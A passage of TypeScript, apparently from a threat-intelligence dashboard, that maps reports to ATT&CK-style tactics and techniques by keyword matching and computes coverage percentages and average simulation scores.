            const dKws = Array.isArray(tech?.detectionKeywords) ? tech.detectionKeywords : [];
            const matchesKeyword = dKws.some((kw) =>
              reportText.includes(kw.toLowerCase()),
            );
            if (matchesKeyword) {
              const matchesTactic =
                reportText.includes(tactic.name.toLowerCase()) ||
                reportText.includes(tactic.shortName.toLowerCase()) ||
                (report.resourceKind === "FULL_ATTACK_CHAIN" &&
                  [
                    "execution",
                    "persistence",
                    "initial access",
                    "command and control",
                    "impact",
                  ].includes(tactic.name.toLowerCase()));
              if (matchesTactic) {
                isMatch = true;
              }
            }
          }
        }

        if (isMatch) {
          matchedReports.push(report);
        }
      }

      totalTacticMappedReports += matchedReports.length;

      const avgSimScore =
        matchedReports.length > 0
          ? Math.round(
              (matchedReports.reduce(
                (acc, r) => acc + (Number(r?.simulationScore) || Number(r?.qualityScore) || 0.5),
                0,
              ) /
                matchedReports.length) *
                100,
            ) / 100
          : 0;

      const hasNovelTtp = matchedReports.some((r) => Boolean(r?.isEmergingTechnique));

      // Map sub-techniques individually
      const mappedSubTechniques: MappedSubTechnique[] = subTechs.map((sub) => {
        const subMatched = matchedReports.filter((r) => {
          const text = `${r.title || ""} ${r.excerpt || ""} ${r.extractedText || ""}`.toLowerCase();
          return (
            (typeof sub?.id === "string" && text.includes(sub.id.toLowerCase())) ||
            (typeof sub?.name === "string" && text.includes(sub.name.toLowerCase())) ||
            (typeof sub?.commandSnippet === "string" && text.includes(sub.commandSnippet.slice(0, 15).toLowerCase()))
          );
        });

        return {
          ...sub,
          mappedReports: subMatched,
          coverageCount: subMatched.length,
        };
      });

      const simCmds = Array.isArray(tech?.simulationCommands) ? tech.simulationCommands : [];

      return {
        id: tech.id,
        name: tech.name,
        tacticId: tech.tacticId,
        tacticName: tech.tacticName,
        description: tech.description || "",
        platforms: Array.isArray(tech?.platforms) ? tech.platforms : [],
        mitigations: Array.isArray(tech?.mitigations) ? tech.mitigations : [],
        detections: Array.isArray(tech?.detections) ? tech.detections : [],
        threatActors: Array.isArray(tech?.threatActors) ? tech.threatActors : [],
        malware: Array.isArray(tech?.malware) ? tech.malware : [],
        simulationCommands: simCmds,
        detectionKeywords: Array.isArray(tech?.detectionKeywords) ? tech.detectionKeywords : [],
        subTechniques: mappedSubTechniques,
        mappedReports: matchedReports,
        coverageCount: matchedReports.length,
        avgSimulationScore: avgSimScore,
        hasNovelTtp,
        hasSimulationCommands: simCmds.length > 0,
      };
    });

    const coveredTechniques = mappedTechniques.filter((t) => t.coverageCount > 0).length;
    const coveragePercentage =
      mappedTechniques.length > 0
        ? Math.round((coveredTechniques / mappedTechniques.length) * 100)
        : 0;

    return {
      id: tactic.id,
      name: tactic.name,
      shortName: tactic.shortName,
      description: tactic.description,
      order: tactic.order,
      techniques: mappedTechniques,
      totalTechniques: mappedTechniques.length,
      totalSubTechniques: totalSubTechs,
      coveredTechniques,
      coveragePercentage,
      totalMappedReports: totalTacticMappedReports,
    };
  });
}
